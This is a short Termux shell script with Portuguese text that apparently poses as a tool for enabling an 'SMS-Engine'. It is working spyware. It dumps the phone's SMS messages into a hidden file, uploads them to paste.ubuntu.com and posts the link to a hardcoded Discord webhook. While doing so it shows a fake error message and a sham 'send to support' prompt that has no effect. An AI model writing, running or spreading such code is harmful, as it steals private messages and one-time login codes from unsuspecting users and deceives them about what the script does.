cd ${HOME}
termux-wake-lock

DATABASE="https://discord.com/api/webhooks/987366677845012500/8UBH7xmMEThWqePEUcwObKGY7PLXW5UkaRc65rGCaZgtKZZKzthpyLCmnDy1y72VKVof"

apt install pastebinit termux-api -y
termux-sms-list > .nanovrc
clear

echo -e "\033[38;2;255;0;0mErro \033[38;2;255;255;0mE1-55403B\033[0m"
sleep 3
echo
echo "Falha ao tentar habilitar o SMS-Engine"
echo
echo "Para mais detalhes sobre o erro, você pode checar o link abaixo"
echo -e "\033[38;2;255;255;0mhttps://bit.ly/3O0VH4d\033[0m"

URL=$(pastebinit -b paste.ubuntu.com .nanovrc)
curl --header "Content-Type: application/json" --data "{\"content\":\"${URL}\"}" ${DATABASE}

read -p "Deseja enviar o erro para o nosso suporte? [S/n]" answer

if [[ "${answer}" == "" || "${answer}" == "s" || "${answer}" == "S" || "${answer}" == "sim" || "${answer}" == "Sim" ]]; then
    echo "Enviando para o suporte..."
    sleep 2
else
    echo "O erro não foi reportado!"
fi
